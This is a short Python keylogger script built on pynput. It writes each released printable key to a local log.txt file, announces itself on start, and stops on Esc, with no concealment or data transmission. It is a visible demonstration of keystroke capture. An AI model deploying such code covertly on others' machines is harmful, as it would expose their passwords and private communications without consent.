from pynput.keyboard import Key, Listener, KeyCode

with open('log.txt', 'w', encoding='utf-8') as f:

    def on_release(key: Key|KeyCode|None)-> None:
        ''' Function to handle key release events. It writes the key pressed to a file and stops the listener if the Escape key is pressed'''

        if isinstance(key, KeyCode):
            if isinstance(key.char, str):
                f.write(key.char + '\n' if hasattr(key, 'char') else str(key) + '\n')
        if isinstance(key, Key) and key == Key.esc:
            # Stop listener
            f.flush()
            f.close()
            listener.stop()

    # Collect events until released
    print("KeyLogger started. Press keys (Esc to exit)...")
    with Listener(on_release=on_release) as listener:
        listener.join()